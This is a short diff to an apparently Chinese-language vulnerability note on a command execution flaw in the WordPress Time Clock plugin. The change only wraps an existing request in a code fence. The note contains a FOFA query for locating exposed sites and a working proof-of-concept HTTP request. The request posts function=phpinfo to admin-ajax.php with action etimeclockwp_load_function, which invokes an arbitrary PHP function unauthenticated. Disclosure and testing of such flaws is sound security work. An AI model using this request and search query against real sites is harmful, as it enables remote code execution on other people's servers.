@@ -71,6 +71,7 @@ FOFA：body="/wp-content/plugins/time-clock/" || body="/wp-content/plugins/time-
 
 POC/EXP：
 
+```http
 POST /wp-admin/admin-ajax.php?action=etimeclockwp_load_function HTTP/2
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
@@ -78,6 +79,7 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 16
 
 function=phpinfo
+```
 
 ![image-20241030110851534](./.resource/WordPressTimeClock插件存在命令执行漏洞/media/image-20241030110851534.png)
 
